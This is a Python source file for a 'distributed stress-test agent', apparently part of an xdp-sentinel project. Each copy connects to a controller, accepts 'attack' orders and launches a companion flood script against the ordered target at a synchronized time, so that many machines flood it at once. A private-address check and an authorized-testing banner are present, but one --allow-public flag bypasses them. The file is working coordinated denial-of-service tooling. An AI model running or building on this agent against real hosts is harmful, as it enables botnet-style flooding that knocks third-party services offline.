#!/usr/bin/env python3
# SPDX-License-Identifier: Apache-2.0
"""Distributed stress-test AGENT for xdp-sentinel.

  *** AUTHORIZED TESTING ONLY ***
  Run this only on machines you control, to test a target you own or have
  written permission to test. It generates a flood on command from a controller.

Run one of these on each of your other computers, pointing at your controller:

  python3 swarm_agent.py 10.55.12.20:9000            # controller ip:port
  python3 swarm_agent.py 10.55.12.20:9000 --name box1

Safety: by default the agent REFUSES to attack a non-private (public-internet)
target. Testing your own public host? pass --allow-public explicitly.

It reuses flood.py (must sit next to this file) as the traffic engine, and
starts exactly at the controller's synchronized time so every machine hits at
once.
"""
from __future__ import annotations

import argparse
import ipaddress
import json
import os
import re
import socket
import subprocess
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
FLOOD = os.path.join(HERE, "flood.py")


def is_private(target: str) -> bool:
    try:
        ip = target
        try:
            ipaddress.ip_address(target)
        except ValueError:
            ip = socket.gethostbyname(target)
        a = ipaddress.ip_address(ip)
        return a.is_private or a.is_loopback or a.is_link_local
    except Exception:
        return False


def run_flood(order: dict) -> dict:
    """Run flood.py per the order and parse its summary into a result dict."""
    cmd = [sys.executable, FLOOD, order["vector"], order["target"], "-d", str(order["duration"])]
    if order.get("ports"):
        cmd += ["--ports", str(order["ports"])]
    if order.get("size"):
        cmd += ["--size", str(order["size"])]
    try:
        out = subprocess.run(cmd, capture_output=True, text=True,
                             timeout=order["duration"] + 60).stdout
    except Exception as e:
        return {"note": f"error: {e}"}

    def grab(rx, cast=float):
        m = re.search(rx, out)
        return cast(m.group(1).replace(",", "")) if m else 0

    return {
        "sent": int(grab(r"sent\s*:\s*([\d,]+)")),
        "pps": grab(r"rate\s*:\s*([\d,]+)"),
        "mb": grab(r"appdata\s*:\s*([\d,.]+)"),
        "gbit": grab(r"throughput:\s*([\d,.]+)"),
    }


def serve(controller_host: str, controller_port: int, name: str, allow_public: bool):
    while True:
        try:
            conn = socket.create_connection((controller_host, controller_port), timeout=10)
        except OSError as e:
            print(f"cannot reach controller {controller_host}:{controller_port} ({e}); retrying in 5s")
            time.sleep(5)
            continue
        print(f"connected to controller {controller_host}:{controller_port} as '{name}'")
        try:
            conn.sendall((json.dumps({"type": "hello", "name": name,
                                      "cpus": os.cpu_count() or 1}) + "\n").encode())
            f = conn.makefile("r")
            for line in f:
                order = json.loads(line)
                if order.get("type") != "attack":
                    continue
                target = order["target"]
                if not allow_public and not is_private(target):
                    print(f"REFUSING public target {target} (pass --allow-public to override)")
                    conn.sendall((json.dumps({"type": "refused", "id": order["id"],
                                              "reason": f"public target {target} blocked"}) + "\n").encode())
                    continue
                # synchronized start
                delay = order.get("start_at", time.time()) - time.time()
                if delay > 0:
                    time.sleep(min(delay, 30))
                print(f">>> attacking {target} ({order['vector']}, {order['duration']}s)")
                res = run_flood(order)
                res.update({"type": "result", "id": order["id"]})
                conn.sendall((json.dumps(res) + "\n").encode())
                print(f"    done: {res.get('pps', 0):,.0f} pps, {res.get('gbit', 0):.2f} Gbit/s")
        except (OSError, ValueError) as e:
            print(f"controller connection lost ({e}); reconnecting...")
        finally:
            try:
                conn.close()
            except OSError:
                pass
        time.sleep(2)


def main():
    ap = argparse.ArgumentParser(description="distributed stress-test agent")
    ap.add_argument("controller", help="controller address, host:port")
    ap.add_argument("--name", default=socket.gethostname())
    ap.add_argument("--allow-public", action="store_true",
                    help="permit attacking non-private targets (you must own/authorize them)")
    args = ap.parse_args()

    if ":" in args.controller:
        host, port = args.controller.rsplit(":", 1)
        port = int(port)
    else:
        host, port = args.controller, 9000

    print(__doc__.split("\n\n")[1].strip())  # AUTHORIZED-ONLY banner
    if not os.path.exists(FLOOD):
        sys.exit(f"flood.py not found next to this script ({FLOOD})")
    serve(host, port, args.name, args.allow_public)


if __name__ == "__main__":
    main()
